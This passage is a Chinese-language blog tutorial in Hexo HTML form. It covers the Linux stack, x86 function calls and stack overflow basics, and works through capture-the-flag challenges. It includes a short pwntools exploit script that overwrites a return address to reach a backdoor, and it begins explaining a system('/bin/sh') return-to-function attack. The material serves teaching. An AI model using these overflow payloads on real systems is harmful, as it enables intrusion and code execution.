@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="wutong">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://wutong01304.github.io/2023/07/05/stack/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="在函数调用过程中，栈（Stack）扮演着重要的角色。它在内存中用于管理函数调用的相关信息，包括参数传递、返回地址和局部变量等。栈的主要作用：  保存参数：当一个函数被调用时，函数的参数会被压入栈中。这样做的目的是为了将函数调用所需的参数传递给被调用函数。参数在栈中以特定顺序被存储，并且在函数调用结束后，可以通过访问栈来获取这些参数的值。  保存返回地址：在函数调用过程中，程序需要知道函数执行完毕">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出基础知识+函数调用过程">
+<meta property="og:url" content="https://wutong01304.github.io/2023/07/05/stack/index.html">
+<meta property="og:site_name" content="wutong">
+<meta property="og:description" content="在函数调用过程中，栈（Stack）扮演着重要的角色。它在内存中用于管理函数调用的相关信息，包括参数传递、返回地址和局部变量等。栈的主要作用：  保存参数：当一个函数被调用时，函数的参数会被压入栈中。这样做的目的是为了将函数调用所需的参数传递给被调用函数。参数在栈中以特定顺序被存储，并且在函数调用结束后，可以通过访问栈来获取这些参数的值。  保存返回地址：在函数调用过程中，程序需要知道函数执行完毕">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack1.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack3.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack4.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack5.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack6.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack7.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack8.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack9.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack2.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack10.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack11.png?x-oss-process=style/watermark">
+<meta property="og:image" content="f:/%E6%88%91/%E5%B7%A5%E4%BD%9C/blogs/stack/stack12.png">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack13.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack14.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack15.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack18.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack17.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack16.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack19.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack20.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack21.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack23.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack22.png?x-oss-process=style/watermark">
+<meta property="article:published_time" content="2023-07-05T14:19:26.000Z">
+<meta property="article:modified_time" content="2023-07-07T10:17:00.684Z">
+<meta property="article:author" content="wutong">
+<meta property="article:tag" content="Stack">
+<meta property="article:tag" content="Basic Knowledge">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack1.png?x-oss-process=style/watermark">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-favicon.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            栈溢出基础知识+函数调用过程 -
+        
+        wutong
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"wutong01304.github.io","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":2,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"static","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"梧桐","subtitle":{"text":["梧桐生矣，于彼朝阳"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/wutong01304","icon":"github"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/7/1 11:45:14"};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                wutong
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    target="_blank" rel="noopener" href="https://github.com/wutong01304"  >
+                                    
+                                        
+                                            <i class="github"></i>
+                                        
+                                        GITHUB
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        target="_blank" rel="noopener" href="https://github.com/wutong01304"  >
+                             
+                                
+                                    <i class="github"></i>
+                                
+                                GITHUB
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+            
+                <div class="article-title">
+                    <h1 class="article-title-regular">栈溢出基础知识+函数调用过程</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/my-logo-avatar.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">wutong</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-07-05 22:19:26</span>
+        <span class="mobile">2023-07-05 22:19</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-07-07 18:17</span>
+            <span class="mobile">2023-07-07 18:17</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Stack/">Stack</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Basic-Knowledge/">Basic Knowledge</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <hr>
+<p>在函数调用过程中，栈（Stack）扮演着重要的角色。它在内存中用于管理函数调用的相关信息，包括参数传递、返回地址和局部变量等。栈的主要作用：</p>
+<ol>
+<li><p>保存参数：当一个函数被调用时，函数的参数会被压入栈中。这样做的目的是为了将函数调用所需的参数传递给被调用函数。参数在栈中以特定顺序被存储，并且在函数调用结束后，可以通过访问栈来获取这些参数的值。</p>
+</li>
+<li><p>保存返回地址：在函数调用过程中，程序需要知道函数执行完毕后应该返回到哪里继续执行。因此，在函数调用之前，调用者的返回地址会被压入栈中，以便函数执行完毕后能正确返回到调用点。</p>
+</li>
+<li><p>管理局部变量：函数内部定义的局部变量通常存储在栈中。每个函数调用都会创建一个新的栈帧，其中包含了局部变量和其他相关信息。栈的先进后出特性使得函数调用结束时，栈帧会被弹出，同时也释放了关联的局部变量的内存空间。</p>
+</li>
+<li><p>实现函数嵌套和递归：栈的存储结构提供了一种便捷的方式来实现函数嵌套和递归。每当一个函数被调用时，一个新的栈帧会被压入栈中，允许在相同的函数内部重复调用自身或其他函数。</p>
+</li>
+<li><p>管理程序执行流程：栈维护了函数调用的先后顺序和返回地址，使得程序能够正确地跳转和控制执行流程。通过压入和弹出栈帧，程序能够按照所需的顺序执行各个函数，并返回至正确的调用点</p>
+</li>
+</ol>
+<p>本篇结合函数调用过程结束栈溢出基础知识，其中一些基础知识放入附录，可以先浏览一遍附录。</p>
+<h1 id="一、栈结构"><a href="#一、栈结构" class="headerlink" title="一、栈结构"></a>一、栈结构</h1><p>数据结构中的栈应该都很熟悉了，复习一下：</p>
+<p>栈（Stack）是一种基本的数据结构，它遵循后进先出（Last-In-First-Out, LIFO）的原则。栈可以看作是一种特殊的线性表，主要支持两个操作：压入（push）和弹出（pop）。压入将元素放入栈的顶部，而弹出则从栈的顶部移除元素。</p>
+<p>栈的特点如下：</p>
+<ol>
+<li>只能在表的一端进行插入和删除操作，该端称为栈顶。</li>
+<li>具有先进后出的特征，最后压入栈的元素首先被弹出。</li>
+<li>无需指定访问位置，只需要对栈执行压入或弹出操作。</li>
+</ol>
+<p>我们要了解的是<strong>linux内存布局中的栈</strong>。</p>
+<p>linux内存布局图如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack1.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>大致了解一下栈所处的位置即可，(详细见附录)。其它部分在后续学习中会陆续了解到。</p>
+<p>Linux中的栈是指进程在内存中用于存储函数调用、局部变量和临时数据的区域。每个进程在运行时都会有自己的栈，该栈按照后进先出（Last-In-First-Out, LIFO）的原则<strong>管理函数调用</strong>。Linux的栈使用虚拟内存技术进行管理，每个进程都有自己独立的栈空间，并且栈从<strong>高地址向低地址</strong>生长。栈的初始大小通常较小，但可以动态地进行扩展。</p>
+<p>栈通常由三个部分组成：</p>
+<p>函数调用：当一个函数被调用时，相关信息如函数参数、返回地址会被压入栈中。在函数执行完毕后，可以通过弹出栈顶元素来回到调用该函数之前的位置。<br>局部变量：每个函数都有其局部变量的存储空间。这些变量在函数调用过程中被压入和弹出栈中。<br>临时数据：栈还用于存储临时数据，例如临时变量、寄存器值等。</p>
+<p>接下来结合函数调用过程了解一下栈的作用。</p>
+<hr>
+<h1 id="二、函数调用过程"><a href="#二、函数调用过程" class="headerlink" title="二、函数调用过程"></a>二、函数调用过程</h1><p>有如下代码:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>)；</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    fun()；</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;end.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>简单了解一下寄存器的作用（详细见附录）：</p>
+<ul>
+<li>eax&#x2F;ebx&#x2F;ecx&#x2F;edx：通用寄存器，保留临时数据</li>
+<li>ebp：栈低指针</li>
+<li>esp：栈顶指针</li>
+<li>eip：指令寄存器，保存当前指令的下一条指令的地址</li>
+</ul>
+<p>在linux系统中使用如下命令编译上述代码：</p>
+<p>-no-pie表示关闭地址随机化ASLR（详细见附录）</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie -o 1 1.c</span><br></pre></td></tr></table></figure></div>
+
+<p>拿到编译好的文件后，使用IDA反汇编，查看main++函数的汇编指令如下：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack3.png?x-oss-process=style/watermark"
+                      style="zoom: 80%;" 
+                >
+
+<p>其中call fun指令是调用fun函数的指令。</p>
+<p>使用gdb对编译好的可执行文件调试，使用 *<em>b <em>0x08048468</em></em> 在call fun处下一个断点，然后使用 <strong>r</strong> 命令开始运行调试，程序停在如下位置：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack4.png?x-oss-process=style/watermark"
+                      style="zoom: 80%;" 
+                >
+
+<p>其中arg表示参数。此时栈结构如下，可见它将参数都压入栈了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack5.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>按 <strong>si</strong> 进入单步调试。即执行了call fun以后，栈结构如下，此时往栈中压入了一个地址0x8048470。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack6.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>这是因为call 指令相当于 push eip; jmp fun 两条指令，即将eip中的值压入栈并跳转到fun函数。我们知道eip中的值是下一条指令的地址。那么下一条指令地址到底指向何处呢？</p>
+<p>从IDA反汇编的图可以看出，call fun函数时，下一条指令为sub esp,10h：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack7.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>即下一条指令地址为0x8048470，也就是我们压入栈的地址。然后看fun函数接下来的指令：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack8.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>会 push ebp，然后 mov ebp, esp。这两条指令的意思为将ebp寄存器的值压入栈，然后将esp寄存器指向ebp的位置。执行后如下：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack9.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>也就是说，<strong>汇编调用函数过程中会首先将参数压栈，然后返回地址（eip）压栈，然后是ebp的地址</strong>。当函数执行到fun函数时，此时栈结构：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack2.png?x-oss-process=style/watermark"
+                      style="zoom:75%;" 
+                >
+
+
+
+<p>程序执行时，栈指针esp和栈顶指针ebp的详细变化如下，参考链接：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/wenger/article/details/1738755" >https://blog.csdn.net/wenger/article/details/1738755 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。可以结合上述调试的过程一起看。</p>
+<p>​		<strong>进入main函数的时候：</strong></p>
+<ol>
+<li><p><strong>保存ebp指针</strong>。  #main函数也是被其他函数调用的（tmainCRTStartup），因此这里会保存tmainCRTStartup的栈底地址，然后ebp指向mian函数栈底。</p>
+</li>
+<li><p><strong>使得ebp-&gt;esp</strong> 。 #esp指针移到ebp处，esp栈顶指针会随着压栈入栈操作不断变化，相当于开辟栈空间。</p>
+</li>
+<li><p><strong>保持现场ebx，esi，edi</strong>。  # 将这些寄存器都压入栈（此时esp不断变化）</p>
+<p><strong>进入一般函数（fun函数）的时候</strong></p>
+</li>
+<li><p><strong>push参数，例如有n个参数 esp &#x3D; esp - 4*n</strong> 。 #32位系统每个栈帧4字节，64位8字节。假设函数为fun(a,b)，会先后把b,a的地址压入栈</p>
+</li>
+<li><p><strong>push函数返回地址 esp &#x3D; esp - 4</strong> 。 #即将下一条指令的地址压入栈</p>
+</li>
+<li><p><strong>jmp 函数地址</strong>。 #这一步不进行出入栈操作，它与上一步同时进行。也就是call指令</p>
+</li>
+<li><p>**push ebp 保存 (故有[ebp+8]就是第一个参数)**。 #正式进入fun函数，重新保存ebp地址（main函数的ebp）。ebp指向fun函数栈底。</p>
+</li>
+<li><p><strong>使得ebp -&gt;esp, esp &#x3D; esp - 40h - 临时变量需要字节数</strong>。 #没有定义任何临时变量的情况下,默认预留64字节的栈内存空间</p>
+</li>
+<li><p><strong>保持现场ebx，esi，edi</strong>。 #和第3步一样</p>
+</li>
+<li><p><strong>返回值eax</strong>。#执行fun函数的内容，即printf(“hello world”)，若有返回值则返回，返回值一般保存在eax寄存器里</p>
+</li>
+<li><p><strong>恢复现场，就是依次pop出edi，esi，ebx</strong>。 #即出栈操作，执行完毕后还原寄存器</p>
+</li>
+<li><p><strong>mov esp, ebp</strong>。 #还原esp，即将esp指向当前ebp的地址</p>
+</li>
+<li><p><strong>pop ebp</strong>。 #还原ebp，ebp重新指向main函数栈底。esp往下移动一个栈帧（esp+4&#x3D;ebp+4），即指向函数返回地址。</p>
+</li>
+<li><p><strong>ret。</strong> #ret指令取出当前栈顶值，作为返回地址，并将指令指针寄存器eip修改为该值，实现函数返回。esp往下移动一个栈帧，esp&#x3D;esp+4</p>
+</li>
+<li><p><strong>esp&#x3D;esp+n*4</strong>。#传回参数，释放形参 。n为参数的数量。</p>
+</li>
+</ol>
+<hr>
+<h1 id="三、栈溢出基本原理"><a href="#三、栈溢出基本原理" class="headerlink" title="三、栈溢出基本原理"></a>三、栈溢出基本原理</h1><h2 id="3-1基本原理"><a href="#3-1基本原理" class="headerlink" title="3.1基本原理"></a>3.1基本原理</h2><p>当一个我们在输入数据时，如果程序对输入没有限制，会导致输入的超出预定的范围，覆盖掉原来的数据。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack10.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>如果我们将返回地址改好覆盖成我们构造的地址，就可以控制程序的走向了。</p>
+<p>例题：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#warmup_csaw_2016" >https://buuoj.cn/challenges#warmup_csaw_2016 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。也可以自己去buuctf上找，题目名字：<strong>warmup_csaw_2016</strong></p>
+<p>用IDA反汇编之后，按 <strong>f5</strong>，查看反汇编代码，发现是一个很简单的函数：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack11.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>在最后一行gets (&amp;v5)那里，有一个漏洞，即没有限制输入长度。查看其它函数，发现：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/%E6%88%91/%E5%B7%A5%E4%BD%9C/blogs/stack/stack12.png"
+                      style="zoom:80%;" 
+                >
+
+<p>函数sub_40060D这里有一个<strong>后门</strong>，执行这个函数就可以获得flag。因此只要我们把返回地址覆盖成sub_40060D的地址，这样程序在执行完get函数返回的时候，就会返回到sub_40060D，这样就可以执行里面的system函数， 然后就可以拿到flag了。</p>
+<p>那么我们要填充多少数据才能使它刚好覆盖到返回地址呢？</p>
+<p>我们知道，返回地址在 ebp 的后面，而 v5 在 ebp-40h 的地方（40h表示十六进制，即0x40&#x3D;64），也就是说，v5大小为0x40，因此只要把v5覆盖了，ebp覆盖了，就能覆盖到返回地址了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack13.png?x-oss-process=style/watermark"
+                      style="zoom:75%;" 
+                >
+
+<p>由于是64位程序，栈帧为8字节，即ebp大小为8字节，因此我们只要填充0x40+8的数据就可以覆盖到返回地址了。如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#使用了pwntools,二进制利用框架</span></span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28137</span>) <span class="comment">#连接到指定地址和端口</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(<span class="number">0x40060D</span>) <span class="comment">#先覆盖0x40+8字节的数据，然后将返回地址覆盖为0x40060D,p64表示以64位地址为格式</span></span><br><span class="line">r.sendline(payload) <span class="comment">#发送构造数据</span></span><br><span class="line">r.interactive() <span class="comment">#进入交互</span></span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack14.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<h2 id="3-2-构造system"><a href="#3-2-构造system" class="headerlink" title="3.2 构造system"></a>3.2 构造system</h2><p>system函数的功能就是调用系统命令，可以通过&#x2F;bin&#x2F;sh命令去执行一个用户执行命令或者脚本。这条我们就可以随意执行命令了，那么怎么构造system函数呢。</p>
+<p>要知道 system(“&#x2F;bin&#x2F;sh”)包含两部分，system函数和bin&#x2F;sh参数。因此我们需要找到system函数和bin&#x2F;sh参数的地址。</p>
+<p>例题：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level2" >https://buuoj.cn/challenges#jarvisoj_level2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。题目名字：<strong>jarvisoj_level2</strong>。</p>
+<p>同样IDA反汇编如下：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack15.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>vulnerable函数中存在溢出点，buf 的栈大小为0x88&#x3D;136字节，32位ebp占4字节，一共140字节。但是read函数可以读取0x100字节的内容，因此存在溢出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack18.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>可以看到有system函数，点击跳转找到system函数地址为0x0804320.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack17.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>然后按 <strong>f12</strong> 查找字符串，找到bin&#x2F;sh字符串地址：0x0804A024</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack16.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>找到地址后，我们如何构造它呢？</p>
